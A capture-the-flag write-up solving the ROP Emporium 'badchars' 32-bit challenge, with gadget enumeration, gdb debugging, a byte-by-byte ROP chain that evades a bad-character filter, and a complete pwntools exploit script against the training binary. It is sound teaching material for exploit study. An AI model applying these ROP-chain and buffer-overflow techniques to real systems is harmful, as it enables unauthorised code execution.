# GIST
The goal of this exercise is use ROP gadgets to bypass a bad character filter and exploit the badchars process. A lot of explanation of ROP gadgets and the stack has been abridged, and is covered in more detail in my writeup on the previous exercise, write4.

# Links
Previous challenge: [write4](https://github.com/curranbrandt/CTF-Writeups/tree/main/ropemporium/write4)
Read about it [here](https://ropemporium.com/challenge/write4.html)


# Identifying and Analyzing Functions
First, let's look at functions imported from shared libraries:

```sh
$rabin2 -i badchars32
[Imports]
nth vaddr      bind   type   lib name
―――――――――――――――――――――――――――――――――――――
1   0x080483b0 GLOBAL FUNC       pwnme
2   0x00000000 WEAK   NOTYPE     __gmon_start__
3   0x080483c0 GLOBAL FUNC       __libc_start_main
4   0x080483d0 GLOBAL FUNC       print_file
```

Now, let's look at innate functions: 
	
```sh
$rabin2 -qs badchars32 | grep -ve imp -e ' 0 '
0x080485dc 4 _IO_stdin_used
0x0804a020 1 completed.7283
0x0804852a 25 usefulFunction
0x080485c0 2 __libc_csu_fini
0x08048440 4 __x86.get_pc_thunk.bx
0x08048560 93 __libc_csu_init
0x08048430 2 _dl_relocate_static_pie
0x080485d8 4 _fp_hw
0x08048506 36 main
```


Let's also use ipython3 to see if there are any functions that we haven't identified with these 2 commands:

```python
In [1]: from pwn import *                                                                                       
In [2]: from pprint import pprint                                                                               
In [3]: elf = ELF("./badchars32")                                                                               
In [4]: pprint(elf.symbols)                                                                                     
{'': 134520864,

< same as in write4 exercise >
}	
```

With this, we can identify the usefulGadgets function, which was also present in the previous exercise


Looking at usefulGadgets in gdb, we can see that the instructions have been changed a bit. This is good because it means we have some more gadgets that we can leverage :)

```asm
gef➤  disass usefulGadgets
Dump of assembler code for function usefulGadgets:
   0x08048543 <+0>:	add    BYTE PTR [ebp+0x0],bl
   0x08048546 <+3>:	ret    
   0x08048547 <+4>:	xor    BYTE PTR [ebp+0x0],bl
   0x0804854a <+7>:	ret    
   0x0804854b <+8>:	sub    BYTE PTR [ebp+0x0],bl
   0x0804854e <+11>:	ret    
   0x0804854f <+12>:	mov    DWORD PTR [edi],esi
   0x08048551 <+14>:	ret    
   0x08048552 <+15>:	xchg   ax,ax
   0x08048554 <+17>:	xchg   ax,ax
   0x08048556 <+19>:	xchg   ax,ax
   0x08048558 <+21>:	xchg   ax,ax
   0x0804855a <+23>:	xchg   ax,ax
   0x0804855c <+25>:	xchg   ax,ax
   0x0804855e <+27>:	xchg   ax,ax
End of assembler dump.
```

# ROPchain Changes
Usefulgadgets no longer has the instruction "0x08048543 : mov dword ptr [edi], ebp ; ret"
It now reads this instead: "mov    DWORD PTR [edi],esi"
So, we no longer want our "flag" string in ebp... we want it in esi
However, the other gadgets in this function add to, subtract from, and xor with the value pointed to by ebp.
So, how can we work with this?

A good kludge is to have ebp and edi store the same addresses. That way we can use our ROP gadgets to both move our string into memory, and modify it.


# Where Store String?
We should consider storing our string in the .data section header. Let's see if it's still available:

```sh
$ readelf -S badchars32  | grep data
  [16] .rodata           PROGBITS        080485d8 0005d8 000014 00   A  0   0  4
  [24] .data             PROGBITS        0804a018 001018 000008 00  WA  0   0  4
```

Nice :) Now let's look at it in gdb:

```sh
gef➤  info files
Symbols from "/home/ubuntu/ropemporium/badchars/badchars32".
Local exec file:
	`/home/ubuntu/ropemporium/badchars/badchars32', file type elf32-i386.
	Entry point: 0x80483f0
	...
	0x08049ffc - 0x0804a000 is .got
	0x0804a000 - 0x0804a018 is .got.plt
	0x0804a018 - 0x0804a020 is .data
```


# How Use ROP
So, we want to use ROP in order to set up our arguments for a call to print_file (just like in the previous exercise), which works much like "cat". We should call print_file("flag.txt"). The only difference here is that certain characters are considered "bad" by the program, and won't be stored properly in memory


# Badchars in Memory
Before we get to debugging, let's see what the bad chars are by simply running the program:
```sh
$ ./badchars32 
badchars by ROP Emporium
x86

badchars are: 'x', 'g', 'a', '.'
> hello
Thank you!
```

Duly noted...


Okay, let's debug our original solution (from write4) and see why it doesn't work with this badchars binary...

```asm
[ Legend: Modified register | Code | Heap | Stack | String ]
─────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0xb       
$ebx   : 0x41414141 ("AAAA"?)
$ecx   : 0xffffffff
$edx   : 0xffffffff
$esp   : 0xffeafd68  →  0x0804854f  →  <usefulGadgets+12> mov DWORD PTR [edi], esi
$ebp   : 0xebeb6c66
$esi   : 0xf7fae000  →  0x001e6d6c
$edi   : 0x0804a018  →  0x00000000
$eip   : 0x080485bc  →  <__libc_csu_init+92> ret 
$eflags: [zero carry parity adjust SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 
─────────────────────────────────────────────────────────────────────────────── stack ────
0xffeafd68│+0x0000: 0x0804854f  →  <usefulGadgets+12> mov DWORD PTR [edi], esi	 ← $esp
0xffeafd6c│+0x0004: 0x080485ba  →  <__libc_csu_init+90> pop edi
0xffeafd70│+0x0008: 0x0804a01c  →  0x00000000
0xffeafd74│+0x000c: 0x74eb74eb
0xffeafd78│+0x0010: 0x0804854f  →  <usefulGadgets+12> mov DWORD PTR [edi], esi
0xffeafd7c│+0x0014: 0x080483d0  →  <print_file@plt+0> jmp DWORD PTR ds:0x804a014
0xffeafd80│+0x0018: 0x64646464
0xffeafd84│+0x001c: 0x0804a018  →  0x00000000
───────────────────────────────────────────────────────────────────────── code:x86:32 ────
    0x80485b9 <__libc_csu_init+89> pop    esi
●   0x80485ba <__libc_csu_init+90> pop    edi
    0x80485bb <__libc_csu_init+91> pop    ebp
 →  0x80485bc <__libc_csu_init+92> ret    
   ↳   0x804854f <usefulGadgets+12> mov    DWORD PTR [edi], esi
       0x8048551 <usefulGadgets+14> ret    
       0x8048552 <usefulGadgets+15> xchg   ax, ax
       0x8048554 <usefulGadgets+17> xchg   ax, ax
       0x8048556 <usefulGadgets+19> xchg   ax, ax
       0x8048558 <usefulGadgets+21> xchg   ax, ax
───────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "badchars32", stopped 0x80485bc in __libc_csu_init (), reason: SINGLE STEP
─────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x80485bc → __libc_csu_init()
[#1] 0x804854f → usefulGadgets()
[#2] 0x80485ba → __libc_csu_init()
[#3] 0x80483d0 → __libc_start_main@plt()
──────────────────────────────────────────────────────────────────────────────────────────
gef➤  i r ebp
ebp            0xebeb6c66          0xebeb6c66
gef➤  x/s ebp
No symbol table is loaded.  Use the "file" command.
gef➤  i r ebp
ebp            0xebeb6c66          0xebeb6c66
gef➤  
```

The ebp shoulddd be 0x67616c66. This converts to "galf," which is what we want, because the string is to be stored in little endian, meaning that the bytes are reversed in order when presented to us humans. However, our ebp is incorrect! It reads 0xebeb6c66... It looks like the last 2 Bytes ("g" and "a") have been converted to hex value "0xeb", which converts to ë... That definitely isn't what we want.

So, there should be a ROP gadget that we can then leverage in order to alter this value in memory, so that it stores the correct string.

Trust, but verify... Let's make sure that ".txt" is also converted to something weird... Since '.' and 'x' are bad chars, ".txt" should be changed to "ëtët", which should look like 0x74eb74eb in memory:

```asm
───────────────────────────────────────────────────────────────────────── code:x86:32 ────
    0x80485b9 <__libc_csu_init+89> pop    esi
●   0x80485ba <__libc_csu_init+90> pop    edi
    0x80485bb <__libc_csu_init+91> pop    ebp
 →  0x80485bc <__libc_csu_init+92> ret    
   ↳   0x804854f <usefulGadgets+12> mov    DWORD PTR [edi], esi
       0x8048551 <usefulGadgets+14> ret    
       0x8048552 <usefulGadgets+15> xchg   ax, ax
       0x8048554 <usefulGadgets+17> xchg   ax, ax
       0x8048556 <usefulGadgets+19> xchg   ax, ax
       0x8048558 <usefulGadgets+21> xchg   ax, ax
───────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "badchars32", stopped 0x80485bc in __libc_csu_init (), reason: SINGLE STEP
─────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x80485bc → __libc_csu_init()
[#1] 0x804854f → usefulGadgets()
[#2] 0x80483d0 → __libc_start_main@plt()
──────────────────────────────────────────────────────────────────────────────────────────
gef➤  i r ebp
ebp            0x74eb74eb          0x74eb74eb
gef➤  
```
	
Okay, so we're right -- all bad chars are replaced with "0xeb"

For our consolation, we can see that the program fails to open the file (named "flëëëtët", pretty cool name, huh?)

```asm
─────────────────────────────────────────────────────────────────────────────── stack ────
0xffeafd34│+0x0000: 0xf7fc68cd  →  "Failed to open file: %s\n"	 ← $esp
0xffeafd38│+0x0004: 0x0804a018  →  0xf7fae000  →  0x001e6d6c
0xffeafd3c│+0x0008: 0x41414141
0xffeafd40│+0x000c: 0xf7fc67db  →  <print_file+12> add ebx, 0x1825
0xffeafd44│+0x0010: 0x41414141
0xffeafd48│+0x0014: 0xf7fc627c  →  0x0000009c
0xffeafd4c│+0x0018: "AAAAAAAAAAAAAAAA"
0xffeafd50│+0x001c: "AAAAAAAAAAAA"
```


# Choosing Gadgets 
Okay, so we previously identified some pretty tasty-looking gadgets in the usefulGadgets function

```asm
gef➤  disass usefulGadgets
Dump of assembler code for function usefulGadgets:
   0x08048543 <+0>:	add    BYTE PTR [ebp+0x0],bl
   0x08048546 <+3>:	ret    
   0x08048547 <+4>:	xor    BYTE PTR [ebp+0x0],bl
   0x0804854a <+7>:	ret    
   0x0804854b <+8>:	sub    BYTE PTR [ebp+0x0],bl
   0x0804854e <+11>:	ret    
   0x0804854f <+12>:	mov    DWORD PTR [edi],esi
   0x08048551 <+14>:	ret    
   0x08048552 <+15>:	xchg   ax,ax
   0x08048554 <+17>:	xchg   ax,ax
   0x08048556 <+19>:	xchg   ax,ax
   0x08048558 <+21>:	xchg   ax,ax
   0x0804855a <+23>:	xchg   ax,ax
   0x0804855c <+25>:	xchg   ax,ax
   0x0804855e <+27>:	xchg   ax,ax
End of assembler dump.
```


In the previous exercise, we used a "useful gadget," along with this one:

```sh
$ ROPgadget --binary badchars32 | grep "pop esi"
...
0x080485b9 : pop esi ; pop edi ; pop ebp ; ret
```



# ROP Chain

With this gadget, we can set up values that will be popped into esi, edi and ebp.
Then, we can store esi (our string, "flag") at the address stored in edi.
We can have ebp store the same address as edi.
In other words (in pseudo-C syntax):
	
		esi = "flag"			
	RG 1	edi = \<ptr to .data\>		
		ebp = edi
	
	RG 2	\*edi = esi
	
	RG 3	\*ebp += 1 (which is the same as \*edi += 1)
		
	
	RG 1 = 0x080485b9
	RG 2 = 0x0804854f
	RG 3 = 0x08048543


So with this, we can write our string into memory, and modify it once it's there.

Referring back to the bad chars section of this write-up, we remember that "flag" won't be stored as "flag", because "a" and "g" are bad strings... So let's store it as "fl@f", and then add 1 to that value


Wait a second, this probably won't work... Since we are adding 1 to a 4 Byte value, "fl\`f", encoded and stored in memory as "\x66\x60\x6c\x66". Incrementing this string/value by 1 will result in "\x66\x60\x6c\x67", which reads "g`lf". Even if we add a Byte with all 1's (0xff) to the string, we'll only modify the second MSB and MSB, as our result would be "\x66\x60\x6d\x65". So, we can't modify our LSB, which we want to change from "\x66" to "\x67" with a single byte, unless if we add that single byte a LOTTTT of times. This probably won't work, because our processes likely doesn't have enough space on the stack in memory to store thousands of ROP gadgets (think, we would have to add "\xff" at least a thousand times to change "\x60" to "\x61", and even more times to change "\x66" to "\x67"). 

This simply won't do...

Let's think about how values are written into memory, and how they are stored in memory...
When we store "fl`f" at the .data section header, which in this case is 0x0804a018, it looks like this:

	        	_______________________________________
	
	 0x0804a018     "f"   	
			_______________________________________
	
	 0x0804a019     "`"   	
			_______________________________________
	
	 0x0804a01a     "l"   	
			_______________________________________
	
	 0x0804a01b     "f"   	
			_______________________________________

How could we write to memory in such a way that we are only overwriting one Byte at a time?
How about we write "abc`" to 0x0804a019?
Then the .data section header would look like this:	

	        	_______________________________________
	
	 0x0804a018     "f"   	
			_______________________________________
	
	 0x0804a019     "`"   	
			_______________________________________
	
	 0x0804a01a     "c"   	
			_______________________________________
	
	 0x0804a01b     "b"   	
			_______________________________________
	
	 0x0804a01c     "a"   	
			_______________________________________

This way, we can overwrite one Byte at a time... Let's replace "abc" with "\x00\x00\x00" (null Bytes)

	        	_______________________________________
	
	 0x0804a018     "f"   	
			_______________________________________
	
	 0x0804a019     "`"   	
			_______________________________________
	
	 0x0804a01a     ""   	
			_______________________________________
	
	 0x0804a01b     ""   	
			_______________________________________
	
	 0x0804a01c     ""   	
			_______________________________________

Okay, awesome! So we can essentially write one Byte at a time. With its address, we should be able to modify it.
If we are writing "f" to 0x0804a019, then edi and ebp = 0x0804a019, and esi = "\x00\x00\x00f", or in little-endian, "f\x00\x00\x00". 
Now, what will happen when we run this ROP gadget?:

	 0x08048543 <+0>:	add    BYTE PTR [ebp+0x0],bl
	 0x08048546 <+3>:	ret    

We will add whatever single-Byte value is stored in bl, to \*ebp.
In this case, \*ebp should look like this:

			_______________________________________

	 0x0804a019     "`"   	
			_______________________________________


Now we should be able to add a single-Byte value to it, which in this scenario will be "1", and the character should now be "a", as "\x60" + "\x01" = "\x61" = "a"
	
			_______________________________________

	 0x0804a019     "a"   	
			_______________________________________

"a" is a bad character, but we modified it from "`" to "a" in memory, after an initial bad-character check by the process as it starts up.
 
# BL Register

So, we should be able to just put a "1" in the BL register, and change all bad characters to their hex equivalent minus one. That way, when we use the ROP gadget that adds BL to *ebp, we are changing characters to what they were meant to be.
	ex:
	bad char = "a"
	So, we change it to "\x61" - "\x1" = "\x60"
	When we add BL ("\x1") to *ebp ("\x60"), we get the original character that we want ("\x61" = "a")


# Where to Put?

Now that we have identified values that we want in the BL register, we need to identify where they go...
We know that BL is the least significant Byte of the value stored in the ebx register. 
Let's use gdb to figure it what ebx is, and how that is determined. 
Open gdb and run the program with an input of 40 A's.

We should manually step through the program to figure out at what point ebx is modified. 


```asm
●  0xf7f917c9 <pwnme+268>      nop    
   0xf7f917ca <pwnme+269>      mov    ebx, DWORD PTR [ebp-0x4]
 → 0xf7f917cd <pwnme+272>      leave  
   0xf7f917ce <pwnme+273>      ret    
   0xf7f917cf <print_file+0>   push   ebp
   0xf7f917d0 <print_file+1>   mov    ebp, esp
   0xf7f917d2 <print_file+3>   push   ebx
   0xf7f917d3 <print_file+4>   sub    esp, 0x34
─────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "badchars32", stopped 0xf7f917cd in pwnme (), reason: SINGLE STEP
───────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0xf7f917cd → pwnme()
[#1] 0x80485ba → __libc_csu_init()
[#2] 0x804854f → usefulGadgets()
[#3] 0x80485ba → __libc_csu_init()
────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  i r bl
bl             0x41                0x41
gef➤  i r ebx
ebx            0x41414141          0x41414141
gef➤  i r ebp
ebp            0xfff9f708          0xfff9f708
gef➤  x/wx $ebp
0xfff9f708:	0x42424242
gef➤  x/wx $ebp-0x4
0xfff9f704:	0x41414141
gef➤  x/2wx $ebp-0x4
0xfff9f704:	0x41414141	0x42424242
```


So it looks like the last 4 A's are put into ebx, and the very first A in that sequence (least significant byte) is stored in ebl



# Crafting Our ROPchain

So now that we have our values that we want to put into the BL register, let's try to set up our ROPchain

Stack layout:

	0x0804a018 - 0x0804a020 is .data

 	A's                                     36B
        _______________________________________
	
	value put into ebx
	first char is value to put into bl
 	 = ?AAA					 4B
	 = 0x01414141

        _______________________________________
        fake ebp
         = "BBBB"                                4B
        _______________________________________
	eip = rop gadget to pop edi, esi, ebp	 4B
        _______________________________________
	esi  =  "fl\x00\x00\x00"
        _______________________________________
        edi
         = &data
         = 0x0804a018                            4B
        _______________________________________
	ebp
         = &data
         = 0x0804a018                            4B
        _______________________________________
	eip = usefulGadget to store string
	________________________________________
        rop gadget 1 address
	 = rop gadget to pop edi, esi, ebp
         = rop.esi				 4B
        _______________________________________
	esi2
	 = "\x60\x00\x00\x00\x00"
        _______________________________________
        edi2
         = &data + 0x2
         = 0x0804a01a                            4B
        _______________________________________
	ebp2
         = edi2 
         = 0x0804a01a                            4B
        _______________________________________
	eip = usefulGadget to store string
        ________________________________________
	eip = usefulGadget to add 1 to \x60
        ________________________________________
	eip = rop gadget to pop edi, esi, ebp
        ________________________________________
	esi3
	 = "\x66\x00\x00\x00\x00"
        _______________________________________
        edi3
         = &data + 0x3
         = 0x0804a01b                            4B
        _______________________________________
	ebp3
	 = edi3
         = 0x0804a01b                            4B
        _______________________________________
	eip = usefulGadget to store string
        ________________________________________
	eip = usefulGadget to add 1 to \x66
        ________________________________________


so, now we should have "flag" in memory at .data (0x..18)

so, let's continue so that it reads "flag.txt" at .data...

	________________________________________
        eip = rop gadget to pop edi, esi, ebp
        ________________________________________
        esi4
         = "\x2d\x00\x00\x00\x00"
        _______________________________________
        edi4
         = &data + 0x4
         = 0x0804a01c                            4B
        _______________________________________
        ebp4
         = edi4
         = 0x0804a01c                            4B
        _______________________________________
        eip = usefulGadget to store string
        ________________________________________
        eip = usefulGadget to add 1 to \x2d
        ________________________________________
        eip = rop gadget to pop edi, esi, ebp
        ________________________________________
        esi5
         = "\x74\x00\x00\x00\x00"
        _______________________________________
        edi5
         = &data + 0x5
         = 0x0804a01d                            4B
        _______________________________________
        ebp5
         = edi5 
         = 0x0804a01d                            4B
        _______________________________________
        eip = usefulGadget to store string
        ________________________________________
        eip = rop gadget to pop edi, esi, ebp
        ________________________________________
        esi6
         = "\x77\x00\x00\x00\x00"
        _______________________________________
        edi6
         = &data + 0x6
         = 0x0804a01e                            4B
        _______________________________________
        ebp6
         = edi6 
         = 0x0804a01e                            4B
        _______________________________________
        eip = usefulGadget to store string
        ________________________________________
        eip = usefulGadget to add 1 to \x77
        ________________________________________
        eip = rop gadget to pop edi, esi, ebp
        ________________________________________
        esi7
         = "\x74\x00\x00\x00\x00"
        _______________________________________
        edi7
         = &data + 0x7
         = 0x0804a01f                            4B
        _______________________________________
        ebp7
         = edi7 
         = 0x0804a01f                            4B
        _______________________________________
        eip = usefulGadget to store string
        ________________________________________
	eip = address of print_file function
        ________________________________________
	arguments = address of .data section



# Pwn Script
So now, let's craft our python script accordingly

```python
from pwn import *
from pprint import pprint
offset = 36

context.arch = 'i386'

elf = ELF("./badchars32")
p = elf.process()
# gdb.attach(p, gdbscript='''
# script
''')


p.recvuntil(b">")

# use rop object to locate gadgets in memory
rop = ROP(elf)

# buffer is 40 A's
buf = b"A"*offset

buf += b"\x01\x41\x41\x41"
# print("buf is: ", buf)
# buf += b"CAAA"


# print out rop gadget to make sure that it reads: "pop edi ; pop ebp ; ret"
# print("gadget to pop esi, edi, ebp 1 is at: ", p32(rop.esi.address))

# it does, so put it into a variable for our payload
pop_values_gadget =  p32(rop.esi.address)

# locate the start of the .data section header 
data_addr = p32(elf.symbols["data_start"])



# esi is the string we want, so = "flag.txt"
# we're gona write "fl", then one byte at a time, because "fl" are the only consecutive non-bad-chars
esi1 = b"fl\x00\x00"
esi2 = b"\x60\x00\x00\x00"
esi3 = b"\x66\x00\x00\x00"
esi4 = b"\x2d\x00\x00\x00"
esi5 = b"\x74\x00\x00\x00"
esi6 = b"\x77\x00\x00\x00"
esi7 = b"\x74\x00\x00\x00"


# first value we're popping is edi... since we want *edi = ebp = "flag", set edi to .data address
# this is because we're writing the string "flag" to memory starting at the .data section
edi1 = data_addr
# now we go to the data address, and go up 2 places, 
edi2 = p32(elf.symbols["data_start"] + 2)
edi3 = p32(elf.symbols["data_start"] + 3)
edi4 = p32(elf.symbols["data_start"] + 4)
edi5 = p32(elf.symbols["data_start"] + 5)
edi6 = p32(elf.symbols["data_start"] + 6)
edi7 = p32(elf.symbols["data_start"] + 7)


#print("edi1 is: " , edi1)
#print("edi2 is: " , edi2)
#print("edi3 is: " , edi3)
#print("edi4 is: " , edi4)
#print("edi5 is: " , edi5)
#print("edi6 is: " , edi6)
#print("edi7 is: " , edi7)


# ebps
fake_ebp1 = p32(elf.symbols["data_start"])
fake_ebp2 = edi2
fake_ebp3 = edi3
fake_ebp4 = edi4
fake_ebp5 = edi5
fake_ebp6 = edi6
fake_ebp7 = edi7

#print("ebp is: " , fake_ebp1)
#print("ebp2 is: " , fake_ebp2)
#print("ebp3 is: " , fake_ebp3)
#print("ebp4 is: " , fake_ebp4)
#print("ebp5 is: " , fake_ebp5)

# address of useful gadget that will set *edi = esi
store_string_in_data_gadget = p32(elf.symbols["usefulGadgets"] + 12)

# address of our rop gadget that adds bl to *ebp
add_1_to_string_gadget = p32(elf.symbols["usefulGadgets"])


# get the address of the print_file function--this is our final function that we are leveraging in order to open the "flag.txt" file                    
print_file_addr = p32(elf.symbols["plt.print_file"])

# arguments for the print_file function are stored in .data section header
args = data_addr

payload = [
        buf,                            # bunch of A's, with EL value = 1
        b"bbbb",                        # fake ebp
        pop_values_gadget,              # addr of "pop edi; pop ebp; ret;"
        esi1,                           # "flag" 
        edi1,                           # addr of start of .data section header
        fake_ebp1,                      # addr of start of .data section header
        store_string_in_data_gadget,     # addr of useful gadget = mov [edi], ebp
        pop_values_gadget,
        esi2,
        edi2,
        fake_ebp2,
        store_string_in_data_gadget,
        add_1_to_string_gadget,
        pop_values_gadget,
        esi3,
        edi3,
        fake_ebp3,
        store_string_in_data_gadget,
        add_1_to_string_gadget,
        pop_values_gadget,
        esi4,
        edi4,
        fake_ebp4,
        store_string_in_data_gadget,
        add_1_to_string_gadget,
        pop_values_gadget,
        esi5,
        edi5,
        fake_ebp5,
        store_string_in_data_gadget,
        pop_values_gadget,
        esi6,
        edi6,
        fake_ebp6,
        store_string_in_data_gadget,
        add_1_to_string_gadget,
        pop_values_gadget,
        esi7,
        edi7,
        fake_ebp7,
        store_string_in_data_gadget,
        print_file_addr,
        b"cccc",
        args
        ]

payload = b"".join(payload)
# print("payload is: ", payload)

p.send(payload)

p.interactive()	
print(p.recvall())
p.close()
	

```

And... Boom!

```sh
	
$ python3 exploit.py
[*] '/home/ubuntu/ropemporium/badchars/badchars32'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
    RUNPATH:  b'.'
[+] Starting local process '/home/ubuntu/ropemporium/badchars/badchars32': pid 61741
[*] Loaded 10 cached gadgets for './badchars32'
[*] Switching to interactive mode
 Thank you!
ROPE{not original}

[*] Got EOF while reading in interactive
$ 

```







